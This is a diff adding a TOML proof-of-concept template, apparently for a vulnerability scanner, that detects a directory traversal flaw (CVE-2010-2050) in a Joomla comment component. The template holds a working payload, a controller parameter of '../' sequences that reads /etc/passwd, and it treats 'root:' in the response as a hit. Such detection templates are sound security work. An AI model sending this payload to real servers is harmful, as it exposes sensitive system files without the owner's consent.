@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 Joomla! Moron Solutions MS Comment（com_mscomment）组件 0.8.0b 版本目录遍历漏洞。通过向 index.php 传递含有 .. 序列的 controller 参数，未经认证的攻击者可读取服务器上的任意文件，如 /etc/passwd 等敏感系统文件。"
+id = "POC-AVE-2010-0092"
+name = "CVE-2010-2050 目录遍历 PoC"
+severity = "high"
+tags = ["ave-2010-0092"]
+vuln_id = [
+    "CVE-2010-2050",
+    "AVE-2010-0092",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "option=com_mscomment&controller=../../../../../../etc/passwd"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
